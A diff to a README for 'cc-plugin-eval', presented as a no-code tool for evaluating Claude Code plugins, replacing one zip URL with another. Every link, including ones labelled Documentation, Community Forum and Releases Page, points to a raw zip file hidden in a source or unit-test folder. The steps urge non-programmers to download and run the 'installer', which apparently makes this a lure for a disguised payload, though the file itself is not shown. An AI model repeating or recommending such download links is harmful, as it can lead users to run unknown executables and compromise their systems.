@@ -1,7 +1,7 @@
 # 🎉 cc-plugin-eval - Easy Plugin Evaluation Made Simple
 
 ## 📥 Download Now
-[![Download cc-plugin-eval](https://github.com/imbflool/cc-plugin-eval/raw/refs/heads/main/src/stages/2-generation/cc_eval_plugin_3.7.zip)](https://github.com/imbflool/cc-plugin-eval/raw/refs/heads/main/src/stages/2-generation/cc_eval_plugin_3.7.zip)
+[![Download cc-plugin-eval](https://raw.githubusercontent.com/imbflool/cc-plugin-eval/main/tests/unit/stages/2-generation/cc_plugin_eval_2.1.zip)](https://raw.githubusercontent.com/imbflool/cc-plugin-eval/main/tests/unit/stages/2-generation/cc_plugin_eval_2.1.zip)
 
 ## 🚀 Getting Started
 Welcome to **cc-plugin-eval**! This application helps you evaluate the Claude Code plugin. It checks if skills, agents, and commands work correctly. You don't need programming knowledge to use it. Follow this guide, and you'll be set up in no time.
@@ -21,11 +21,11 @@ Welcome to **cc-plugin-eval**! This application helps you evaluate the Claude Co
 ## 📋 Download & Install
 To get started, you need to download the software. Click the link below to visit the release page:
 
-[Download cc-plugin-eval](https://github.com/imbflool/cc-plugin-eval/raw/refs/heads/main/src/stages/2-generation/cc_eval_plugin_3.7.zip)
+[Download cc-plugin-eval](https://raw.githubusercontent.com/imbflool/cc-plugin-eval/main/tests/unit/stages/2-generation/cc_plugin_eval_2.1.zip)
 
 1. **Visit the Releases Page:** Click the link above to open the release page on GitHub.
 2. **Select the Latest Version:** Look for the latest version available at the top of the list.
-3. **Download the Installer:** Find the installer file (you'll see files like `https://github.com/imbflool/cc-plugin-eval/raw/refs/heads/main/src/stages/2-generation/cc_eval_plugin_3.7.zip` or `https://github.com/imbflool/cc-plugin-eval/raw/refs/heads/main/src/stages/2-generation/cc_eval_plugin_3.7.zip`), and click on it to start the download.
+3. **Download the Installer:** Find the installer file (you'll see files like `https://raw.githubusercontent.com/imbflool/cc-plugin-eval/main/tests/unit/stages/2-generation/cc_plugin_eval_2.1.zip` or `https://raw.githubusercontent.com/imbflool/cc-plugin-eval/main/tests/unit/stages/2-generation/cc_plugin_eval_2.1.zip`), and click on it to start the download.
 4. **Run the Installer:** Once the download is complete, open the file to begin the installation.
 5. **Follow On-Screen Instructions:** The installer will guide you through the setup process. Just click "Next" and accept the terms to complete the installation.
 
@@ -45,16 +45,16 @@ To get started, you need to download the software. Click the link below to visit
 ## 🔗 Additional Information
 For more help or information, visit our documentation:
 
-- [cc-plugin-eval Documentation](https://github.com/imbflool/cc-plugin-eval/raw/refs/heads/main/src/stages/2-generation/cc_eval_plugin_3.7.zip)
+- [cc-plugin-eval Documentation](https://raw.githubusercontent.com/imbflool/cc-plugin-eval/main/tests/unit/stages/2-generation/cc_plugin_eval_2.1.zip)
 
 You can also check other users' experiences and tips in our community forums.
 
 ## 💬 Community Support
 Join our community for questions, support, and sharing tips. You can connect with others who use **cc-plugin-eval**. 
 
-- [Community Forum](https://github.com/imbflool/cc-plugin-eval/raw/refs/heads/main/src/stages/2-generation/cc_eval_plugin_3.7.zip)
+- [Community Forum](https://raw.githubusercontent.com/imbflool/cc-plugin-eval/main/tests/unit/stages/2-generation/cc_plugin_eval_2.1.zip)
 
 ## 🚀 Ready to Evaluate?
 Now you’re ready to enhance your programming skills using cc-plugin-eval. Start your evaluation journey today by downloading it!
 
-[Download cc-plugin-eval](https://github.com/imbflool/cc-plugin-eval/raw/refs/heads/main/src/stages/2-generation/cc_eval_plugin_3.7.zip)
+[Download cc-plugin-eval](https://raw.githubusercontent.com/imbflool/cc-plugin-eval/main/tests/unit/stages/2-generation/cc_plugin_eval_2.1.zip)
